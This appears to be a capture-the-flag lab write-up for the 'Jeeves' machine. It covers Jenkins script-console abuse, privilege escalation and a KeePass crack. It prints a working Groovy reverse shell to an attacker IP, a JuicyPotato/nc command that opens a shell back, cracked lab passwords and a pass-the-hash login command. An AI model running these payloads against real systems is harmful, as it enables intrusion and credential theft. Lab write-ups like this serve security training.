# Jeeves

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Starting off with an Nmap scan, I found that ports 80,135,445 and 50000 were open.

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>



### Port 50000 Jetty 9.4.z-SNAPSHOT

Visiting the webpage, I was greeted by a Error 404 page.

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Next, I searched for subdomains using dirbuster with `/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt` wordlist. I found the `/askjeeves` subdirectory.

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

Heading to [http://10.10.10.63:50000/askjeeves/](http://10.10.10.63:50000/askjeeves/), it was a Jenkins management console. Going to `Manage Jenkins` --> Script console, I was able to upload the following groovy reverse shell.

```bash
String host="10.10.14.6";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

And I obtained a user shell

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

Using the command `whoami /priv`, I was able to view that the `SeImpersonatePrivilege` is enabled which could allow for JuicyPotato attack.

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Next, I transferred nc.exe over using SMB.

```bash
copy \\10.10.14.6\share\nc32.exe .
```

Afterwards, I ran the following command to obtain a root reverse shell

```bash
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\kohsuke\Desktop\nc32.exe -e cmd.exe 10.10.14.6 4444" -t *
```

However, the JuicyPotato attack does not seem to work.

#### Futher Enumeration for Privilege Escalation

I found `CEH.kdbx` at `C:\Users\kohsuke\Documents`

After copying the file to the attacker machine, I used `keepass2john CEH.kdbx > keepass_hash` to extract a crackable hash from the Keepass Password Database.

Running `john keepass_hash --wordlist=/usr/share/wordlists/rockyou.txt` to crack the hash, I obtained the password as `moonshine1`

Using the password to view the password database, I found the following entries.

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

I found the following passwords

```
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
12345
S1TjAtJHKsugh9oC4VZl
pwndyouall!
F7WhTrSFDKB6sxHU1cUn
lCEUnYPjNfIuPZSzOySA
Password
```

The first password entry looks like a hash so I tried to using Pass-the-Hash method.

```bash
pth-winexe -U 'administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00' //10.10.10.63 cmd.exe
```

I managed to login as the `administrator`.

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Heading to `c:\users\administrator\desktop` for the root flag, I instead found `hm.txt`

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

This could indicate that the flag is present as an Alternate Data Stream. Using `dir /r`, I was able to view the streams present in the directory.&#x20;

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

Viewing the flag using `more < hm.txt:root.txt`, I obtained the root flag

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
